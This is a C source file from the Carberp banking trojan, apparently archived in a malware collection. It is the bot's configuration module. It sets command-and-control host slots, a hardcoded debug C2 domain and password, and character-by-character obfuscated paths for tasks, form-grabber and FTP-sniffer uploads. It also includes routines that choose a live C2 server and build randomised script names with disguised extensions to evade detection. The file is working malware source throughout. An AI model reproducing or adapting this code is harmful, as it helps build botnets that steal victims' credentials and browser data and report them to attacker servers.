/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Loader.h"
#include "Task.h"
#include "BotClasses.h"

#include "Modules.h"

#include "BotDebug.h"


//char MainHost_1[] = "FULL_URL_1__________________________________________________________________________________________";
//char MainHost_2[] = "FULL_URL_2__________________________________________________________________________________________";
//char MainHost_3[] = "FULL_URL_3__________________________________________________________________________________________";

char MainHost_1[101] = "FULL_URL_1\0";
char MainHost_2[101] = "FULL_URL_2\0";
char MainHost_3[101] = "FULL_URL_3\0";

char Delay[8]  = "DELAY_\0";

char BOT_PREFIX[21] = "BOT_UID\0";

#ifdef CryptHTTPH
	char MainPassword[MAX_PASSWORD_SIZE + 1] = "MAIN_PASSWORD\0";
	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/
#endif


// ��� ����� � �������� �������� ���
//PCHAR BotHosts[] = {MainHost_1, MainHost_2, MainHost_3};


// ������ ��������
#ifndef CryptHTTPH
	const static char PathTask[]        = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l',0};
	const static char PathFirstInfo[]   = {'/','s','e','t','/','f','i','r','s','t','.','h','t','m','l',0};
	const static char PathFormGrabber[] = {'/','g','e','t','/','f','g','r','.','h','t','m','l',0};
	const static char PathFTPSniffer[]  = {'/','g','e','t','/','s','n','i','.','h','t','m','l',0};
	const static char PathGrabber[]     = {'/','g','e','t','/','g','r','a','.','h','t','m','l',0};
#endif

const static char PathConfig[]      = {'/','c','f','g','/',0};
const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};



// ���������� ��������� ��� ����� SET
const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"};

// ���������� ��������� ��� ����� GET
const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};


#ifdef DEBUGCONFIG

	//char DebugHost[255] = "check.ples.in";
    //char DebugHost[255] = "botadmin";
	//char DebugHost[255] = "apartman-adriana.com";
	//char DebugHost[255] = "check.ples.in";
	char DebugHost[255]	= "check.plaro.in";
	//char DebugHost[255]	= "sharik2.com";

    PCHAR DebugPassword = "XKQjxprqBfVbZsDc";

	DWORD DebugDelay = 1;
	char DebugBotPrefix[] = "tst";
#endif


char *GetPrefix()
{
	#ifdef DEBUGCONFIG
		return DebugBotPrefix;
	#endif

	char *Ret = Decrypt(BOT_PREFIX);
	return Ret;
}

PCHAR GetMainHostByID(BYTE ID)
{
	// ��������� ��� ����� �� ������
	switch (ID)
	{
	case 0: return MainHost_1;
	case 1: return MainHost_2;
	case 2: return MainHost_3;
    default:
        return NULL;
	}
}

PCHAR GetScriptByID(BYTE ID, bool &Created)
{
	// �������� ����� ������� �� ��� ������
	switch (ID)
	{
	case ScriptConfig:
		Created = true;
		return STR::New(2, (PCHAR)PathConfig, GetPrefix());

	// ������ ���� �������
	case ScriptFormGrabber:
		#ifdef CryptHTTPH
			Created = true;
			return GenerateRandomScript(1, 3, 24, 26, sizeof(GETFolderExts) / sizeof(PCHAR), (PCHAR*)&GETFolderExts[0]);
		#else
			return (PCHAR)PathGrabber;
		#endif

	// ������ ��������� �����
	case ScriptTask:
		#ifdef CryptHTTPH
			Created = true;
			return GenerateRandomScript(1, 6, 18, 24, sizeof(SETFolderExts) / sizeof(PCHAR), (PCHAR*)&SETFolderExts[0]);
		#else
			return (PCHAR)PathTask;
		#endif

	// ������ ��������
	case ScriptFirstInfo:
		#ifdef CryptHTTPH
			Created = true;
			return GenerateRandomScript(7, 12, 25, 30, sizeof(SETFolderExts) / sizeof(PCHAR), (PCHAR*)&SETFolderExts[0]);
		#else
			return (PCHAR)PathFirstInfo;
		#endif

	case ScriptPlugins:     return (PCHAR)PathPlugins;

	// ������ FTP �������
	case ScriptFTPSniffer:
		#ifdef CryptHTTPH
			Created = true;
			return GenerateRandomScript(7, 9, 31, 33, sizeof(GETFolderExts) / sizeof(PCHAR), (PCHAR*)&GETFolderExts[0]);
		#else
			return (PCHAR)PathFTPSniffer;
		#endif


	// ������ �������
	case ScriptGrabber:
		#ifdef CryptHTTPH
			Created = true;
			return GenerateRandomScript(4, 6, 27, 30, sizeof(GETFolderExts) / sizeof(PCHAR), (PCHAR*)&GETFolderExts[0]);
		#else
			return (PCHAR)PathGrabber;
		#endif



	default:
	   return NULL;
	}
}



int GetDelay()
{
	#ifdef DEBUGCONFIG
		return DebugDelay;
	#endif

	return m_atoi( Delay );
}

#ifdef DEBUGCONFIG
	// � ���������� ������ ������������� ����������� ���������� ���������� ����
	
	void SetDebugHost(PCHAR Host)
	{
		
		if (!StrCopy(DebugHost, Host))
        	StrCopy(DebugHost, "localhost");
	}
#endif


char *GetCurrentHost()
{
	#ifdef DEBUGCONFIG
		return STR::New(DebugHost);
	#endif


	// ���� ���� ����������!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	char *Ret = NULL;

	char CurrentHost[ 128 ];

	m_lstrcpy( CurrentHost, Decrypt( MainHost_1 ) );

	if ( CheckHost( CurrentHost ) )
	{
		Ret = CurrentHost;
	}
	else
	{
		m_lstrcpy( CurrentHost, Decrypt( MainHost_2 ) );

		if ( CheckHost( CurrentHost ) )
		{
			Ret = CurrentHost;
		}
		else
		{
			m_lstrcpy( CurrentHost, Decrypt( MainHost_3 ) );

			if ( CheckHost( CurrentHost ) )
			{
				Ret = CurrentHost;
			}
		}
	}	

	return Ret;
}

PCHAR GetCurrentHost2()
{
	// ������� ���������� ������ ������� ����� �� ������� ������������ ������
	#ifdef DEBUGCONFIG
		return STR::New(DebugHost);
	#endif

	PCHAR Result = NULL;
	BYTE i = 0;
	do
	{
		PCHAR Host = GetMainHostByID(i); 
		if (Host == NULL)
			break;
		Result = STR::New(Decrypt(Host));
		i++;

		if (CheckHost(Result))
			break;
		STR::Free2(Result);
	}
	while (1);

	return Result;
}

PCHAR GetBotScriptURL(BYTE Script)
{
	// ������� ���������� ������ ����� �������
    bool PathCreated = false;
	PCHAR Path = GetScriptByID(Script, PathCreated);


	if (Path == NULL)
		return NULL;
	

	PCHAR Host = GetCurrentHost2();
	if (Host == NULL)
		return NULL;

    PCHAR Result = STR::New(3, "http://", Host, Path);

	STR::Free(Host);
	if (PathCreated)
		STR::Free(Path);

	return Result;
}



// ������� ���������� ������ ��� ����������� �����������/������������ ������
#ifdef CryptHTTPH
	PCHAR GetMainPassword()
	{
		#ifdef DEBUGCONFIG
			return STR::New(DebugPassword);
		#endif

		// ��������� ����� �� � ���� ������
		if (CalcHash(MainPassword) == MainPasswordNameHash)
			return NULL;

		PCHAR P = STR::Alloc(StrCalcLength(MainPassword));
		Decrypt(MainPassword, P);
		return P;
	}
#endif


PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts)
{
	// ������� ���������� ��������� ��� �������
	DWORD Sz = 0;
	if (Random::Generate(0, 1000) < 500)
		Sz = Random::Generate(Min1, Max1);
	else
		Sz = Random::Generate(Min2, Max2);

	PCHAR Name = Random::RandomString(Sz, 'a', 'z');

	// ��������� ���������� �������

	DWORD ExtPos = Random::Generate(1, ExtsCount);
	for (DWORD i = 1; i < ExtPos; i++, Exts++);
	PCHAR Ext = *Exts;

	PCHAR Script = STR::New(3, "/", Name, Ext);

	STR::Free(Name);

    return Script;
}
